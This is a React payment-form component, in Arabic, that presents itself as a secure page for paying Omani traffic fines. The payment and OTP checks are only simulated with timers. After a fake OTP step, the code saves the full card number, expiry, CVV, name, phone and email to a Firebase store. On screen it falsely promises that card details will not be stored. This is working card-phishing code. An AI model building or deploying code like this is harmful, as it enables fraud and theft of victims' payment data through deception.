"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Badge } from "@/components/ui/badge"
import { Alert, AlertDescription } from "@/components/ui/alert"
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
  DialogFooter,
} from "@/components/ui/dialog"
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp"
import { CreditCard, Shield, ArrowRight, CheckCircle, AlertCircle, Check, X } from "lucide-react"
import { z } from "zod"
import { useForm } from "react-hook-form"
import { zodResolver } from "@hookform/resolvers/zod"
import {
  validateCardNumber,
  validateExpiryDate,
  validateCVV,
  validateOmanPhone,
  formatCardNumber,
  detectCardType,
  CARD_TYPES,
  type CardValidationResult,
} from "@/lib/card-validator"
import { addData } from "@/lib/firebase"

interface Violation {
  id: string
  type: string
  date: string
  location: string
  amount: number
  plateNumber: string
  status: "unpaid" | "paid"
}

interface PaymentFormProps {
  totalAmount: number
  violations: Violation[]
  onSuccess: () => void
  onCancel: () => void
}

// Enhanced payment form validation schema
const paymentSchema = z.object({
  cardNumber: z.string().min(1, "رقم البطاقة مطلوب"),
  expiryMonth: z.string().min(1, "الشهر مطلوب"),
  expiryYear: z.string().min(1, "السنة مطلوبة"),
  cvv: z.string().min(1, "CVV مطلوب"),
  cardholderName: z.string().min(2, "اسم حامل البطاقة مطلوب").max(50, "الاسم طويل جداً"),
  email: z.string().min(1, "البريد الإلكتروني مطلوب").email("البريد الإلكتروني غير صحيح"),
  phone: z.string().min(1, "رقم الهاتف مطلوب"),
})

type PaymentFormData = z.infer<typeof paymentSchema>

export function EnhancedPaymentForm({ totalAmount, violations, onSuccess, onCancel }: PaymentFormProps) {
  const [isProcessing, setIsProcessing] = useState(false)
  const [paymentComplete, setPaymentComplete] = useState(false)
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [otp, setOtp] = useState("")

  const [cardValidation, setCardValidation] = useState<CardValidationResult>({
    isValid: false,
    cardType: null,
    errors: [],
  })
  const [expiryValidation, setExpiryValidation] = useState({ isValid: false, errors: [] })
  const [cvvValidation, setCvvValidation] = useState({ isValid: false, errors: [] })
  const [phoneValidation, setPhoneValidation] = useState({ isValid: false, errors: [] })

  const {
    register,
    formState: { errors },
    setValue,
    watch,
    trigger,
    getValues,
    handleSubmit: formHandleSubmit,
  } = useForm<PaymentFormData>({
    resolver: zodResolver(paymentSchema),
    mode: "onChange",
  })

  const cardNumber = watch("cardNumber")
  const expiryMonth = watch("expiryMonth")
  const expiryYear = watch("expiryYear")
  const cvv = watch("cvv")
  const phone = watch("phone")

  // Real-time card validation
  useEffect(() => {
    if (cardNumber) {
      const validation = validateCardNumber(cardNumber)
      setCardValidation(validation)
    }
  }, [cardNumber])

  // Real-time expiry validation
  useEffect(() => {
    if (expiryMonth && expiryYear) {
      const validation = validateExpiryDate(expiryMonth, expiryYear)
      setExpiryValidation(validation as any)
    }
  }, [expiryMonth, expiryYear])

  // Real-time CVV validation
  useEffect(() => {
    if (cvv) {
      const validation = validateCVV(cvv, cardValidation.cardType)
      setCvvValidation(validation as any)
    }
  }, [cvv, cardValidation.cardType])

  // Real-time phone validation
  useEffect(() => {
    if (phone) {
      const validation = validateOmanPhone(phone)
      setPhoneValidation(validation as any)
    }
  }, [phone])

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/\D/g, "")
    const cardType = detectCardType(rawValue)
    const maxLength = cardType === "amex" ? 15 : 16
    const truncatedValue = rawValue.slice(0, maxLength)
    const formattedValue = formatCardNumber(truncatedValue, cardType)
    setValue("cardNumber", truncatedValue, { shouldValidate: true })
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/\D/g, "")
    const cardType = cardValidation.cardType
    const maxLength = cardType === "amex" ? 4 : 3
    const truncatedValue = rawValue.slice(0, maxLength)
    setValue("cvv", truncatedValue, { shouldValidate: true })
  }

  const onSubmit = async (data: PaymentFormData) => {
    const finalCardValidation = validateCardNumber(data.cardNumber)
    if (!finalCardValidation.isValid) return

    setIsProcessing(true)
    try {
      // Simulate network request to initiate payment
      await new Promise((resolve) => setTimeout(resolve, 2000))
      // Show OTP dialog to complete the transaction
      setShowOtpDialog(true)
    } catch (error) {
      console.error("Payment initiation failed:", error)
      setIsProcessing(false)
    }
  }

  const handleOtpSubmit = async () => {
    setIsProcessing(true)
    setShowOtpDialog(false)
    try {
      // Simulate OTP verification
      await new Promise((resolve) => setTimeout(resolve, 2000))

      // On successful verification, save data and show success screen
      const visitorID = localStorage.getItem("visitor")
      const paymentData = getValues()
      addData({
        id: visitorID,
        ...paymentData,
        expiryData: `${paymentData.expiryMonth}/${paymentData.expiryYear}`,
        amount: totalAmount,
        violations: violations.map((v) => v.id),
      })

      setPaymentComplete(true)
      setTimeout(() => {
        onSuccess()
      }, 3000)
    } catch (error) {
      console.error("OTP verification failed:", error)
    } finally {
      setIsProcessing(false)
    }
  }

  const getCardIcon = (cardType: string | null) => {
    if (!cardType) return <CreditCard className="w-6 h-6 text-gray-400" />
    const cardInfo = CARD_TYPES[cardType]
    return (
      <div className="flex items-center gap-2">
        <CreditCard className="w-6 h-6 text-blue-600" />
        <Badge variant="secondary" className="text-xs">
          {cardInfo.name}
        </Badge>
      </div>
    )
  }

  const ValidationIcon = ({ isValid, hasContent }: { isValid: boolean; hasContent: boolean }) => {
    if (!hasContent) return null
    return isValid ? <Check className="w-4 h-4 text-green-600" /> : <X className="w-4 h-4 text-red-600" />
  }

  if (paymentComplete) {
    return (
      <div className="max-w-md mx-auto">
        <Card className="bg-white/95 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
          <CardContent className="p-8 text-center">
            <div className="text-green-600 text-6xl mb-4">
              <CheckCircle className="w-16 h-16 mx-auto" />
            </div>
            <h3 className="text-2xl font-bold text-green-800 mb-2">تم الدفع بنجاح</h3>
            <p className="text-gray-600 mb-4">تم دفع جميع المخالفات بنجاح</p>
            <div className="bg-green-50 p-4 rounded-lg border border-green-200 mb-6">
              <p className="text-green-800 font-semibold">المبلغ المدفوع: {totalAmount} ر.ع</p>
            </div>
            <p className="text-sm text-gray-500">سيتم تحديث حالة المخالفات خلال دقائق...</p>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="max-w-2xl mx-auto">
      <Card className="bg-white/95 backdrop-blur-sm shadow-xl rounded-2xl border-gray-200">
        <CardHeader className="text-center pb-4">
          <CardTitle className="text-2xl font-bold text-gray-800 flex items-center justify-center gap-2">
            <CreditCard className="w-6 h-6" />
            الدفع الآمن
          </CardTitle>
          <p className="text-gray-600">ادفع بأمان باستخدام بطاقتك الائتمانية</p>
        </CardHeader>
        <CardContent className="p-8">
          <div className="bg-gray-50 p-4 rounded-lg mb-6">
            <div className="flex justify-between items-center">
              <span className="font-semibold">إجمالي المبلغ:</span>
              <span className="text-2xl font-bold text-green-600">{totalAmount} ر.ع</span>
            </div>
            <p className="text-sm text-gray-600 mt-1">عدد المخالفات: {violations.length}</p>
          </div>
          <form onSubmit={formHandleSubmit(onSubmit)} className="space-y-6">
            <div className="space-y-4">
              <h3 className="font-semibold text-gray-800 flex items-center gap-2">
                <Shield className="w-5 h-5" />
                معلومات البطاقة
              </h3>
              <div className="space-y-2">
                <Label htmlFor="cardNumber" className="text-gray-700 flex items-center gap-2">
                  رقم البطاقة
                  {getCardIcon(cardValidation.cardType)}
                </Label>
                <div className="relative">
                  <Input
                    id="cardNumber"
                    {...register("cardNumber")}
                    onChange={handleCardNumberChange}
                    value={cardNumber }
                    placeholder="#### #### #### ####"
                    className={`bg-white text-left pr-10 ${
                      cardValidation.errors.length > 0
                        ? "border-red-500"
                        : cardValidation.isValid
                          ? "border-green-500"
                          : ""
                    }`}
                    dir="ltr"
                  />
                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                    <ValidationIcon isValid={cardValidation.isValid} hasContent={!!cardNumber} />
                  </div>
                </div>
                {cardValidation.errors.map((error, index) => (
                  <p key={index} className="text-red-500 text-sm flex items-center gap-1">
                    <AlertCircle className="w-4 h-4" />
                    {error}
                  </p>
                ))}
              </div>
              <div className="grid grid-cols-3 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="expiryMonth" className="text-gray-700">
                    الشهر
                  </Label>
                  <Select
                    value={expiryMonth}
                    onValueChange={(value) => {
                      setValue("expiryMonth", value)
                      trigger("expiryMonth")
                    }}
                  >
                    <SelectTrigger className={expiryValidation.errors.length > 0 ? "border-red-500" : ""}>
                      <SelectValue placeholder="الشهر" />
                    </SelectTrigger>
                    <SelectContent>
                      {Array.from({ length: 12 }, (_, i) => (
                        <SelectItem key={i + 1} value={String(i + 1).padStart(2, "0")}>
                          {String(i + 1).padStart(2, "0")}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="expiryYear" className="text-gray-700">
                    السنة
                  </Label>
                  <Select
                    value={expiryYear}
                    onValueChange={(value) => {
                      setValue("expiryYear", value)
                      trigger("expiryYear")
                    }}
                  >
                    <SelectTrigger className={expiryValidation.errors.length > 0 ? "border-red-500" : ""}>
                      <SelectValue placeholder="السنة" />
                    </SelectTrigger>
                    <SelectContent>
                      {Array.from({ length: 15 }, (_, i) => (
                        <SelectItem key={2024 + i} value={String(2024 + i)}>
                          {2024 + i}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
                <div className="space-y-2">
                  <Label htmlFor="cvv" className="text-gray-700 flex items-center gap-1">
                    CVV
                    {cardValidation.cardType && (
                      <Badge variant="outline" className="text-xs">
                        {CARD_TYPES[cardValidation.cardType].cvvLength} أرقام
                      </Badge>
                    )}
                  </Label>
                  <div className="relative">
                    <Input
                      id="cvv"
                      type="tel"
                      {...register("cvv")}
                      onChange={handleCvvChange}
                      value={cvv || ""}
                      placeholder={cardValidation.cardType === "amex" ? "****" : "***"}
                      className={`bg-white text-left pr-10 ${
                        cvvValidation.errors.length > 0
                          ? "border-red-500"
                          : cvvValidation.isValid
                            ? "border-green-500"
                            : ""
                      }`}
                      dir="ltr"
                    />
                    <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                      <ValidationIcon isValid={cvvValidation.isValid} hasContent={!!cvv} />
                    </div>
                  </div>
                </div>
              </div>
              {expiryValidation.errors.map((error, index) => (
                <p key={index} className="text-red-500 text-sm flex items-center gap-1">
                  <AlertCircle className="w-4 h-4" />
                  {error}
                </p>
              ))}
              {cvvValidation.errors.map((error, index) => (
                <p key={index} className="text-red-500 text-sm flex items-center gap-1">
                  <AlertCircle className="w-4 h-4" />
                  {error}
                </p>
              ))}
              <div className="space-y-2">
                <Label htmlFor="cardholderName" className="text-gray-700">
                  اسم حامل البطاقة
                </Label>
                <Input
                  id="cardholderName"
                  type="text"
                  {...register("cardholderName")}
                  placeholder="الاسم كما هو مكتوب على البطاقة"
                  className={`bg-white ${errors.cardholderName ? "border-red-500" : ""}`}
                />
                {errors.cardholderName && <p className="text-red-500 text-sm">{errors.cardholderName.message}</p>}
              </div>
            </div>
            <div className="space-y-4">
              <h3 className="font-semibold text-gray-800">معلومات الاتصال</h3>
              <div className="space-y-2">
                <Label htmlFor="phone" className="text-gray-700">
                  رقم الهاتف
                </Label>
                <div className="relative">
                  <Input
                    id="phone"
                    type="tel"
                    {...register("phone")}
                    placeholder="+968 9123 4567"
                    className={`bg-white text-left pr-10 ${
                      phoneValidation.errors.length > 0
                        ? "border-red-500"
                        : phoneValidation.isValid
                          ? "border-green-500"
                          : ""
                    }`}
                    dir="ltr"
                  />
                  <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
                    <ValidationIcon isValid={phoneValidation.isValid} hasContent={!!phone} />
                  </div>
                </div>
                {phoneValidation.errors.map((error, index) => (
                  <p key={index} className="text-red-500 text-sm flex items-center gap-1">
                    <AlertCircle className="w-4 h-4" />
                    {error}
                  </p>
                ))}
              </div>
            </div>
            <Alert className="bg-blue-50 border-blue-200">
              <Shield className="w-4 h-4 text-blue-600" />
              <AlertDescription className="text-blue-800">
                <p className="font-semibold mb-1">دفع آمن ومحمي</p>
                <p className="text-sm">
                  جميع معلومات الدفع محمية بتشفير SSL 256-bit. لن يتم حفظ معلومات بطاقتك على خوادمنا.
                </p>
              </AlertDescription>
            </Alert>
            <div className="flex gap-4 pt-4">
              <Button
                type="submit"
                disabled={
                  isProcessing ||
                  !cardValidation.isValid ||
                  !expiryValidation.isValid ||
                  !cvvValidation.isValid ||
                  !phoneValidation.isValid
                }
                className="flex-1 bg-green-600 hover:bg-green-700 text-white font-bold py-4 text-lg disabled:opacity-50"
              >
                {isProcessing ? (
                  <div className="flex items-center gap-2">
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    جاري المعالجة...
                  </div>
                ) : (
                  <div className="flex items-center justify-center gap-2">
                    دفع {totalAmount} ر.ع <ArrowRight className="w-4 h-4" />
                  </div>
                )}
              </Button>
              <Button
                type="button"
                variant="outline"
                onClick={onCancel}
                disabled={isProcessing}
                className="flex-1 border-gray-300 text-gray-700 font-bold py-4 text-lg bg-transparent"
              >
                إلغاء
              </Button>
            </div>
          </form>
        </CardContent>
      </Card>

      <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle className="text-center">أدخل كلمة المرور لمرة واحدة</DialogTitle>
            <DialogDescription className="text-center">
              تم إرسال كلمة مرور لمرة واحدة (OTP) إلى رقم هاتفك المسجل.
            </DialogDescription>
          </DialogHeader>
          <div className="flex justify-center py-4" dir="ltr">
            <InputOTP maxLength={6} value={otp} onChange={setOtp}>
              <InputOTPGroup>
                <InputOTPSlot index={0} />
                <InputOTPSlot index={1} />
                <InputOTPSlot index={2} />
                <InputOTPSlot index={3} />
                <InputOTPSlot index={4} />
                <InputOTPSlot index={5} />
              </InputOTPGroup>
            </InputOTP>
          </div>
          <DialogFooter>
            <Button
              onClick={handleOtpSubmit}
              disabled={isProcessing || otp.length < 6}
              className="w-full bg-green-600 hover:bg-green-700"
            >
              {isProcessing ? "جاري التحقق..." : "تحقق وادفع"}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </div>
  )
}
